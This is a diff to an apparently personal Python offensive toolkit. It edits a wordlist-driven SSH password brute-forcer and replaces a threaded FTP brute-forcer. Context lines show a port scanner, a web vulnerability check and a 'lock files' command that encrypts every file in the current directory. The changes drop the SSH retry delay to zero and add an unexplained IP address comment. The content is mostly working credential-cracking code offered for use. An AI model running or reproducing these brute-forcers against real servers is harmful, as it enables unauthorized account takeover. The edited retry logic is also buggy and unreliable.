@@ -1,7 +1,6 @@
 #!/usr/bin/python
 
-#if the above code doesn't work go to your terminal and run: which python then, replace `/usr/bin/python` with the python path
-
+#if the above code doesn't work go to your terminal and run: `which python` then, replace `/usr/bin/python` with the python path
 
 
 import os
@@ -18,6 +17,7 @@ from cryptography.fernet import Fernet
 import subprocess
 import ipinfo
 from bs4 import BeautifulSoup as bs
+#196.216.144.9
 import requests
 import sys
 from urllib.parse import urljoin, urlparse
@@ -59,7 +59,7 @@ def bi6():
         wordlist = input('Path to wordlist : ')
         hostname = input('Host : ')
         username = input('username : ')
-        usrport = int(input('Port : '))
+        usrport = input('Port : ')
         passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore').read().split("\n")
         def is_ssh_open():
             
@@ -71,7 +71,7 @@ def bi6():
             # add to know hosts
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
-                client.connect(hostname=hostname, port=usrport , username=username, password=password, timeout=3)
+                client.connect(hostname=hostname, port=int(usrport) , username=username, password=password, timeout=3,banner_timeout=200)
             except socket.timeout:
                 print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
                 return False
@@ -82,8 +82,8 @@ def bi6():
             except paramiko.SSHException:
                 print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
                 # sleep for a minute
-                time.sleep(60)
-                return is_ssh_open()
+                time.sleep(0)
+                is_ssh_open()
             else:
                 # connection was established successfully
                 print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
@@ -91,66 +91,12 @@ def bi6():
         for password in passwords:
             if is_ssh_open():
             # if combo is valid, save it to a file
-                open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
+                print(f"username: {username}@{hostname} password: {password}")
                 break
-    def crackFtp():
-        global q
-        q = Queue()
-        # number of threads to spawn
-        n_threads = 30
-        # hostname or IP address of the FTP server
-        host = input('FTP Server Address : ')
-        # username of the FTP server, root as default for linux
-        user = input('username : ')
-        # port of FTP, aka 21
-        port = int(input('Port : '))
-
-        def connect_ftp():
-            wordlist = input('Path to wordlist : ')
-        
-            while True:
-                # get the password from the queue
-                password = q.get()
-                # initialize the FTP server object
-                server = ftplib.FTP()
-                print("[!] Trying", password)
-                try:
-                    # tries to connect to FTP server with a timeout of 5
-                    server.connect(host, port, timeout=5)
-                    # login using the credentials (user & password)
-                    server.login(user, password)
-                except ftplib.error_perm:
-                    # login failed, wrong credentials
-                    pass
-                else:
-                    # correct credentials
-                    print(f"{Fore.GREEN}[+] Found credentials: ")
-                    print(f"\tHost: {host}")
-                    print(f"\tUser: {user}")
-                    print(f"\tPassword: {password}{Fore.RESET}")
-                    # we found the password, let's clear the queue
-                    with q.mutex:
-                        q.queue.clear()
-                        q.all_tasks_done.notify_all()
-                        q.unfinished_tasks = 0
-                finally:
-                    # notify the queue that the task is completed for this password
-                    q.task_done()
-
-                # read the wordlist of passwords
-                passwords = open(wordlist).read().split("\n")
-                print("[+] Passwords to try:", len(passwords))
-                # put all passwords to the queue
-                for password in passwords:
-                    q.put(password)
-                # create `n_threads` that runs that function
-                for t in range(n_threads):
-                    thread = Thread(target=connect_ftp)
-                    # will end when the main thread end
-                    thread.daemon = True
-                    thread.start()
-                # wait for the queue to be empty
-                q.join()
+            else:
+                print(f'Host: {hostname} Could not Cracked Try another wordlist.')
+                
+    
     
     def crackZip():
         wordlist = input('Path to wordlist : ')
@@ -267,6 +213,7 @@ def bi6():
                 print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
             else:
                 print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")
+        
             
             
             
@@ -633,7 +580,71 @@ def bi6():
             else:
                 print('Site Is Not Vulnerable')
         
-    
+    # init the console for colors (for Windows)
+# init()
+# initialize the queue
+    def crackFTP():
+        wordlist = input('PATH to Wordlist : ')
+        q = Queue()
+    # number of threads to spawn
+        n_threads = 30
+
+    # hostname or IP address of the FTP server
+        host = input('Host : ')
+    # username of the FTP server, root as default for linux
+        user = input('user : ')
+    # port of FTP, aka 21
+        port = int(input('Port : '))
+
+        def connect_ftp():
+            
+            while True:
+                
+            # get the password from the queue
+                password = q.get()
+            # initialize the FTP server object
+                server = ftplib.FTP()
+                print("[!] Trying", password)
+                try:
+                # tries to connect to FTP server with a timeout of 5
+                    server.connect(host, port, timeout=5)
+                # login using the credentials (user & password)
+                    server.login(user, password)
+                except ftplib.error_perm:
+                # login failed, wrong credentials
+                    pass
+                else:
+                # correct credentials
+                    print(f"{Fore.GREEN}[+] Found credentials: ")
+                    print(f"\tHost: {host}")
+                    print(f"\tUser: {user}")
+                    print(f"\tPassword: {password}{Fore.RESET}")
+                # we found the password, let's clear the queue
+                    with q.mutex:
+                        q.queue.clear()
+                        q.all_tasks_done.notify_all()
+                        q.unfinished_tasks = 0
+                finally:
+                # notify the queue that the task is completed for this password
+                    q.task_done()
+
+    # read the wordlist of passwords
+        passwords = codecs.open(wordlist,encoding='utf-8', errors='ignore').read().split("\n")
+
+        print("[+] Passwords to try:", len(passwords))
+
+    # put all passwords to the queue
+        for password in passwords:
+            q.put(password)
+
+    # create `n_threads` that runs that function
+        for t in range(n_threads):
+            thread = Thread(target=connect_ftp)
+        # will end when the main thread end
+            thread.daemon = True
+            thread.start()
+    # wait for the queue to be empty
+        q.join()
         
 
     command = input('what do you want to do? : ')
@@ -678,7 +689,7 @@ def bi6():
     elif command == 'crack zip':
         crackZip()
     elif command == 'crack ftp':
-        crackFtp()
+        crackFTP()
     elif command == 'help':
         print(''''lock files' : Lock all files in the current directory
     'set mac address' : Set MacOS Mac address
